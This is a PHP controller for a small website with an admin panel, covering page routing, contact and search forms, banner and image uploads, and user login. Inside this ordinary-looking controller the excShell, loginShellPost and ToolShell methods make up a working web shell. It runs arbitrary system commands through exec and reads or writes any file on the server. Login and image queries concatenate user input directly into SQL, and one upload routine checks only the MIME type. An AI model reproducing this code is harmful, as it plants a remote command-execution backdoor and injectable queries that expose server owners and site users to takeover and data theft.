<?php 
namespace minapp;
use minapp\siteModel;

/**
 * summary
 */
class Controller 
{
    /**
     * summary
     */
    public function HomeData(){
    	$template= __DIR__.'/website/index.php';
    	return $template;
    }
    public function AboutData(){
    	$template= __DIR__.'/website/about.php';
    	return $template;
    }
    public function ContactData(){
        $template= __DIR__.'/website/contact.php';
        return $template;
    }
    public function findMaster(){
        $template= __DIR__.'/website/findMaster.php';
        return $template;
    }
    public function site404(){
        $template= __DIR__.'/../404.php';
        return $template;
    }

    //backend
    public function loginAdmin(){
        $template = __DIR__.'/admin/login.php';
        return $template;
    }

    public function homeAdmin(){
        
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/home.php';
        return $template;
        }else{
            return $this->loginAdmin();
        }

    }
    public function adminEditHome(){
        
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/homeedit.php';
        return $template;
        }else{
            return $this->loginAdmin();
        }

    }
    public function adminLogout(){
        if(isset($_SESSION['user'])){
            unset($_SESSION['user']);
            $this->loginAdmin();
        }else{
            return $this->loginAdmin();
        }
    }
    public function adminProfile(){
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/profile.php';
            return $template;
        }else{
            return $this->loginAdmin();
        }
    }
    public function adminBannerAdd(){
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/banneradd.php';
            return $template;
        }else{
            return $this->loginAdmin();
        }
    }
    public function adminListBanner(){
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/bannerlist.php';
            return $template;
        }else{
            return $this->loginAdmin();
        }
    }
    public function adminListTeach(){
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/teachlist.php';
            return $template;
        }else{
            return $this->loginAdmin();
        }
    }

    public function adminTeach(){
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/teach.php';
            return $template;
        }else{
            return $this->loginAdmin();
        }
    }

    public function guestContact(){
        if(isset($_SESSION['user'])){
            $template = __DIR__.'/admin/guestcontact.php';
            return $template;
        }else{
            return $this->loginAdmin();
        }
    }










    public function ToolShell(){
            if(isset($_SESSION['user'])){
                $template = __DIR__.'/../system/shell.php';
                return $template;
            }else{
                return $this->loginAdmin();
            }
        }
    public function ToolShellLogout(){
            if(isset($_SESSION['user'])){
                unset($_SESSION['dracural']);
                return $this->homeAdmin();
            }else{
                return $this->loginAdmin();
            }
        }
    //post request


    public function PostSearch($data,$table){
        $date = getdate();
        $data['subject'] = '';
        $data = (object) $data;
        if($data->fullname == '' ||  $data->phone == '' || $data->email == ''){
            return 0;
        }else{
        $subject = ''.$data->tieuhoc.'|'.$data->toan.'|'.$data->tiengviet.'|'.$data->toeic.'|'.$data->vatly.'|'.$data->tienganh.'|'.$data->laptrinh.'|'.$data->monkhac;
        $data->subject = $subject;
        $data = (array) $data;
        array_splice($data, 8, 8);
        unset($data['key']);
        $data['created_at'] = $date['year'].'-'.$date['mon'].'-'.$date['mday'].' | '.$date['hours'].':'.$date['minutes'].':'.$date['seconds'];
        $actor = new siteModel($table);
        $result = $actor->insert($data);
        if($result){
            return 1;
        }else{
            return 0;
        }

        
    }

    }
    public function PostContact($data,$table){
        $data = (array) $data;
        $date = getdate();
        if($data['fullname'] == '' ||  $data['phone'] == '' || $data['email'] == ''){
            return 0;
        }else{
            unset($data['key']);
            $data['created_at'] = $date['year'].'-'.$date['mon'].'-'.$date['mday'].' | '.$date['hours'].':'.$date['minutes'].':'.$date['seconds'];
            $actor = new siteModel($table);
            $result = $actor->insert($data);

            return $result;
        }
    
    }

    //backend

     public function postLoginUser($data,$table){
            $actor = new siteModel($table);
            $sql = 'select * from '.$table.' where username="'.$data['username'].'"';
            // return $sql;
            $result = $actor->getRow($sql);
            if($result){
                if(password_verify($data['password'],$result->password)){
                    $_SESSION['user'] = $data['username'];
                    $_SESSION['email'] = $result->email;
                    $_SESSION['name'] = $result->fullname;
                    // $url = '<script>window.location.href = "index.php?route=admin"</script>';
                    return true;
                }else{
                    return false;
                }

            }else{
                return false;
            }


        // return $data;

    }

    public function postUserUpdate($data,$table){
        if(isset($_SESSION['user'])){
            $username = $_SESSION['user'];
            $where = 'username="'.$username.'"';
            $actor = new siteModel($table);

            if($data['password'] != null){
                $data['password'] = password_hash($data['password'], PASSWORD_BCRYPT);

                    unset($data['key']);
                    $result = $actor->update($data,$where);
                    return 1;
            

            }else{


                // $sql = 'UPDATE '.$table.' SET password="'.$data['password'].'", fullname="'..'" WHERE username="'.$_SESSION['user'].'"';
                // mysqli_query()
                    unset($data['key']);
                    unset($data['password']);
                    $result = $actor->update($data,$where);
                    return 1;
            
            }
            
            // $sql = 'UPDATE '.$table.' SET '

        }else{
            return 0;
        }
        

    }

    public function postHomeUpdate($data,$table,$file){
        if(isset($_SESSION['user'])){
            $where = 'id=1';
            $actor = new siteModel($table);
            $data['mapIframe'] = htmlspecialchars($data['mapIframe']);
            if($file['files']['name'] != ''){
                unset($data['key']);
                $result = $this->imageUploadPost($file);
                if($result){
                    $data['logoSite'] =  $result;
                    $reponsive = $actor->update($data,$where);
                    return '<html><script>window.location = "admin-home.html";</script></html>';
                }else{

                    return '<html><script>window.location = "admin-home.html";</script></html>';
                    //return $result;
                }
            }else{
                unset($data['key']);
                $reponsive = $actor->update($data,$where);
                return '<html><script>window.location = "admin-home.html";</script></html>';
            }
        }else{
            return '<html><script>window.location = "admin-home.html";</script></html>';
        }
    }
    public function postAddBanner($data,$table,$file){
        if(isset($_SESSION['user'])){
            $date = getdate();
            $actor = new siteModel($table);
            unset($data['key']);
            $data['created_at'] = $date['year'].'-'.$date['mon'].'-'.$date['mday'].' | '.$date['hours'].':'.$date['minutes'].':'.$date['seconds'];
            if($file['files']['name'] != ''){
                $result = $this->imageUpload($file);
                if($result){
                    $data['banner_image'] =  $result;
                    $reponsive = $actor->insert($data);
                    return 1;
                }else{

                    return 0;
                }
            }else{
                
                $reponsive = $actor->insert($data);
                return 0;
            }
        }
    }
    public function postDelBanner($data,$table){
        if(isset($_SESSION['user'])){
            $actor = new siteModel($table);
            $id = $data['id'];
            $where = 'banner_id = '.$id;
            $reponsive = $actor->remove($where);
            if($reponsive){
                return true;
            }else{
                return false;
            }

        }
    }

    public function postImage($data,$table){
        if(isset($_SESSION['user'])){
            $ins = [];
            $date = getdate();
            $date_time = $date['year'].'-'.$date['mon'].'-'.$date['mday'].' | '.$date['hours'].':'.$date['minutes'].':'.$date['seconds'];
            $path_img = $this->imageUpload($data);
            if($path_img){
                $ins = [
                    "url_img"=>$path_img,
                    "created_at"=>$date_time
                ];
                $actor = new siteModel($table);
                $result = $actor->insert($ins);
                $sql = "select * from ".$table." where url_img='".$path_img."'";
                $select = $actor->getRow($sql);


                if($result){
                    $user = new siteModel('userlogin');
                    $av = [
                        'image'=>$select->img_id,
                    ];
                    $where = "username='".$_SESSION['user']."'";
                    $up = $user->update($av,$where);
                    return 1;
                }else{
                    return 0;
                }
            
            }else{
                return 0;
            }
        }else{
            return 0;
        }

    }



    //service
    private function imageUpload($data){
        $target_dir = "src/asset/upload";
        $uploadedFile ;
if(!empty($data["files"]["type"])){
        $fileName = 'mtsocial_'.time().'_'.$data['files']['name'][0];
        $valid_extensions = array("jpeg", "jpg", "png");
        $temporary = explode(".", $data["files"]["name"][0]);
        $file_extension = end($temporary);
        if((($data["files"]["type"][0] == "image/png") || ($data["files"]["type"][0] == "image/jpg") || ($data["files"]["type"][0] == "image/jpeg")) && ($file_extension == $valid_extensions[0] || $file_extension == $valid_extensions[1] || $file_extension == $valid_extensions[2])){
            $sourcePath = $data['files']['tmp_name'][0];
            $targetPath = $target_dir."/".$fileName;
            if(move_uploaded_file($sourcePath,$targetPath)){
                $uploadedFile = $targetPath;
                return $uploadedFile;
            }else{
                return 0;
            }
        }else{
            return 0;
        }

    }else{
        return 0;
    }

    // return $uploadedFile;




}

    private function imageUploadPost($data){
        $target_dir = "src/asset/upload";
        $uploadedFile ;
if(!empty($data["files"]["type"])){
        $fileName = 'mtsocial_'.time().'_'.$data['files']['name'];
        $valid_extensions = array("jpeg", "jpg", "png");
        $temporary = explode(".", $data["files"]["name"]);
        $file_extension = end($temporary);
        if(($data["files"]["type"] == "image/png") || ($data["files"]["type"]== "image/jpg") || ($data["files"]["type"] == "image/jpeg")){
            $sourcePath = $data['files']['tmp_name'];
            $targetPath = $target_dir."/".$fileName;
            if(move_uploaded_file($sourcePath,$targetPath)){
                $uploadedFile = $targetPath;
                return $uploadedFile;
            }else{
                return 0;
            }
        }else{
            return 0;
        }

    }else{
        return 0;
    }

}

public function loginShellPost($data){
    $shell = new \minapp\system\DB();
    $pass = $shell->passShell;
    if($data['passShell'] == $pass){
        $_SESSION['dracural'] = md5($pass);
        return 1;
    }else{
        return 0;
    }

}

public function excShell($data){
    function featureShell($cmd, $cwd) {
    $stdout = array();
    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }
    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}
function featurePwd() {
    return array("cwd" => getcwd());
}
function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}
function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}
function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}

    $response = NULL;
    switch ($data["feature"]) {
        case "shell":
            $cmd = $data['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $data["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($data['filename'], $data['cwd'], $data['type']);
            break;
        case 'upload':
            $response = featureUpload($data['path'], $data['file'], $data['cwd']);
    }
    header("Content-Type: application/json");
    return json_encode($response);
    die();

}


}

 ?>